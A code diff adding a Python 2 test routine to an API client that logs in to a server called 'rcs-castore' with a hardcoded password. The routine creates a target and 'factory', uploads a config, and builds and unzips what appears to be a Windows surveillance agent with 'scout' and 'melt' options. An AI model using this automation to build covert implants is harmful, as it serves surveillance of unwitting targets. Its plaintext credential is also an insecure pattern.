@@ -261,3 +261,50 @@ class API:
         out.write(resp)
         
         print "[*] bytes saved to %s" % out_file
+
+
+def test():
+    print 'test'
+    host = "rcs-castore"
+    user = "avmonitor"
+    passwd = "avmonitorp1234"
+    conn = API(host, user, passwd)
+    print conn.login()
+ 
+    if(False):
+        operation, target, factory = '511dfd70aef1de05f8001090', '511e44d4aef1de05f800137a', '511e44d5aef1de05f8001380'
+ 
+    else:
+        operation = conn.operation('AVMonitor')
+        target = conn.target_create(operation,'Turca','la mia targa')
+        factory = conn.factory_create(operation, target, 'desktop', 'fattoria', 'degli animali')
+        print "factory: ", factory
+        #sleep(10)
+ 
+        config = open('config.json').read()
+        conn.factory_add_config(factory, config)
+ 
+    param = { 'platform': 'windows',
+          'binary': { 'demo' : False, 'admin' : False},
+          'melt' : {'scout' : True, 'admin' : False, 'bit64' : True, 'codec' : True },
+          'sign' : {}
+          }
+ 
+    #{"admin"=>false, "bit64"=>true, "codec"=>true, "scout"=>true}
+    try:
+        r = conn.build(factory, param, 'build.out')
+    except Exception, e:
+        print e
+    
+    r = unzip('build.out')
+    print r
+ 
+    r = conn.enum_instances( factory )
+    print r
+ 
+    #sleep(5)
+    conn.target_delete(target)
+    print operation, target, factory
+    print conn.logout()
+if __name__ == "__main__":
+    test()
